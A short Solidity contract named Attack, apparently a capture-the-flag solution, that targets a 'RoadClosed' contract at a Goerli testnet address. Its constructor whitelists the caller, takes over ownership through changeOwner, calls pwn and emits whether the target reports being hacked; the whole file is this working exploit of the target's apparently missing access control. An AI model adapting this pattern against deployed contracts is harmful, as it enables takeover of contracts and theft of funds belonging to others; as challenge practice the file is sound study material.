// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.7;

import {RoadClosed} from "./RoadClosed.sol";

contract Attack {

  RoadClosed roadClosed;

  event Hacked(bool isHacked);

  constructor() {
    // https://goerli.etherscan.io/address/0xd2372eb76c559586be0745914e9538c17878e812#code
    roadClosed = RoadClosed(0xD2372EB76C559586bE0745914e9538C17878E812);
    
    roadClosed.addToWhitelist(msg.sender);
    roadClosed.changeOwner(msg.sender);
    roadClosed.pwn(msg.sender);

    emit Hacked(roadClosed.isHacked());
  }
}